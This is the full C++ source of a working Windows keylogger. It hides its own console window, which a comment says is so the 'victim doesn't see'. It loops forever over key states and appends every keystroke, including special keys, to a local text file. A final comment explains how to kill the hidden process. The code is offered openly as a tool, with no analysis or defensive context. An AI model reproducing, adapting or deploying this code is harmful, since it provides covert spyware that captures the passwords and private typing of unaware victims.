#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;

//will save data to the file
void save(string d)
{
	fstream f;
	//ope file and using "app" so that old data does not get erased
	f.open("file.txt", ios::app);
	//write data to file
	f << d;
	//close file
	f.close();
}

//will translate any special key
string translate(int k)
{
	string r;
	
	switch (k)
	{
		case '1':
			r = "1";
			break;
		case '2':
			r = "2";
			break;
		case '3':
			r = "3";
			break;
		case '4':
			r = "4";
			break;
		case '5':
			r = "5";
			break;
		case '6':
			r = "6";
			break;
		case '7':
			r = "7";
			break;
		case '8':
			r = "8";
			break;	
		case '9':
			r = "9";
			break;
		case VK_SPACE:
			//Space Key
			r = " ";
			break;
		case VK_RETURN:
			//Enter Key
			r = "\n";
			break;
		case VK_BACK:
			//Backspace Key
			r = "\b";
			break;
		case VK_CAPITAL:
			//Capslock Key
			r = "[CAPS_LOCK]";
			break;
		case VK_SHIFT:
			//Shift Key
			r = "[SHIFT]";
			break;
		case VK_TAB:
			//tab Key
			r = "[TAB]";
			break;
		case VK_CONTROL:
			//CTRL Key
			r = "[CTRL]";
			break;
		case VK_MENU:
			//ALT Key
			r = "[ALT]";
			break;
		default:
			r = k;
			break;					
	}
	return r;
}
int main()
{
	//To hide .exe file so that victim doesn't see
	HWND h = GetConsoleWindow();
	ShowWindow(h, SW_HIDE);
	
	string key;
	//infinite loop
	for(int i=1;i>0;i++)
	{
		for (int k=8;k<=190;k++)
		{
			//To check iff key is pressed
			if(GetAsyncKeyState(k) == -32767)
			{
				//translate the key into string and special keys
				key = translate(k);
				//save it int the file through save() function above
				save(key);
			}
		}
	}
}


//As the .exe file is hidden and the loop is infinite, to close the program open cmd and write taskkill /F /IM [FILENAME].exe
//In this case taskkill /F /IM Project.exe